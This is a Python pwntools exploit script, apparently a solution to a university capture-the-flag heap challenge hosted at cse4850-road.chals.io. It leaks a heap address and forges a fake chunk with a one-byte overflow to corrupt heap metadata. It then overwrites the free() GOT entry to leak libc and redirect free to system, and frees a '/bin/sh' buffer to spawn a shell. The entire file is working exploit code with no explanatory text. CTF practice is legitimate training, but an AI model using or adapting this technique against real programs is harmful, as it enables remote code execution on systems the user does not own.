from pwn import *

binary = "./chal.bin_patched"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

libc = ELF("libc.so.6")

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path)
    if args.REMOTE:
        return remote("cse4850-road.chals.io", 443, ssl=True, sni="cse4850-road.chals.io")
    return process(e.path)

p = start()

def create():
    log.info("Creating a new instrument")
    p.sendlineafter(b'choice:', b'1')

def fill(index, content):
    log.info(f"Filling instrument {index} with {content}")
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'):', str(index).encode('utf-8'))
    p.sendafter(b'container:', content)

def view(index):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'):', str(index).encode('utf-8'))
    p.recvuntil(b'contents:\n')
    content = p.recvline()[:-1]
    log.info(f"Instrument {index} has content {content}")
    return content

def free(index):
    log.info(f"Freeing instrument {index}")
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'):', str(index).encode('utf-8'))

def leak_heap():
    log.info("Leaking heap...")
    p.sendlineafter(b'choice', b'3')
    p.sendlineafter(b'):', b'21')
    p.recvuntil(b'at 0x')
    leak_str = p.recvline()[:-1]
    leak = int(leak_str, 16)
    log.info(f"Heap leak: {hex(leak)}")
    return leak

def create_fake_chunk(heap_addr):
    log.info(f"Creating fake chunk...")
    payload = b'\0'*8
    payload += p64(0x91)
    payload += p64(heap_addr)
    payload += p64(heap_addr + 0x8)
    payload += b'A' * 0x70
    payload += p64(0x90)
    payload += b'\xa0'
    fill(4, payload)

for _ in range(5):
    create()
heap_addr = leak_heap()
create_fake_chunk(heap_addr)
free(5)

fill(4, p64(e.got['free']))
free_leak = u64(view(1) + b'\0\0')
log.info(f"Free leak: {hex(free_leak)}")

libc.address = free_leak - libc.symbols['free']
fill(1, p64(libc.symbols['system']))
fill(2, b'/bin/sh')
free(2)

p.interactive()